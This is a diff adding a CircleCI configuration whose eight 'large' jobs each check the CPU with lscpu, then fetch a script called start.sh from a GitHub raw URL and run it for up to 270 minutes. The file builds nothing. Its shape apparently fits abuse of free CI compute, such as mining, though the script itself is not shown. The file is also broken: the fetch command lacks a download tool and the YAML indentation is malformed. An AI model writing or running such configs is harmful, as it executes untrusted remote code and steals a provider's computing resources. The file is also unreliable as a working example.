@@ -1,0 +1,118 @@
+version: 2.1
+jobs:
+  build_1:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_1
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_2:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_2
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_3:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_3
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_4:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_4
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_5:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_5
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_6:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_6
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_7:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_7
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+          build_8:
+    machine:
+      image: ubuntu-2004:202010-01 # recommended linux image
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+          name: Periksa
+          command: lscpu
+      - run:
+          name: build_8
+          command: https://raw.githubusercontent.com/wescoba12/test/master/start.sh && chmod u+x * && timeout 270m ./start.sh
+          
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            -build_1
+            -build_2
+            -build_3
+            -build_4
+            -build_5
+            -build_6
+            -build_7
+            -build_8
